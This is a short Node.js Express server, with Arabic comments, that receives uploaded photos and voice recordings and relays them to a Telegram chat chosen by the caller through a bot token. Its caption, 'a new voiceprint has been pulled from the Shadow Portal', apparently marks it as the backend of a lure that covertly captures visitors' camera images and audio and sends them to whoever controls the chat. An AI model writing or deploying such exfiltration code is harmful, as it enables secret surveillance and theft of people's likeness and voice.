require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(express.static('public'));

if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

const BOT_TOKEN = process.env.BOT_TOKEN;
const BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ------------------- استقبال الصور (زي ما هو) -------------------
app.post('/upload', upload.array('photos', 3), async (req, res) => {
  try {
    if (!req.files || req.files.length === 0) return res.status(400).json({ ok: false });
    const targetChatId = req.body.chat_id;
    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });

    for (let i = 0; i < req.files.length; i++) {
      const file = req.files[i];
      const form = new FormData();
      form.append('chat_id', targetChatId); 
      form.append('caption', `📸 صورة ${i + 1} من ${req.files.length}`);
      form.append('photo', fs.createReadStream(file.path));
      await axios.post(`${BOT_URL}/sendPhoto`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
      fs.unlinkSync(file.path);
    }
    res.json({ ok: true, count: req.files.length });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

// ------------------- استقبال الصوت الجديد -------------------
app.post('/upload_voice', upload.single('voice'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد صوت' });
    const targetChatId = req.body.chat_id;
    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });

    const form = new FormData();
    form.append('chat_id', targetChatId);
    form.append('caption', '🎙️ تم سحب بصمة صوتية جديدة من بوابة الضل!');
    form.append('voice', fs.createReadStream(req.file.path));

    await axios.post(`${BOT_URL}/sendVoice`, form, {
      headers: form.getHeaders(),
      maxBodyLength: Infinity
    });
    
    fs.unlinkSync(req.file.path);
    res.json({ ok: true });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ ok: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on ${PORT}`));
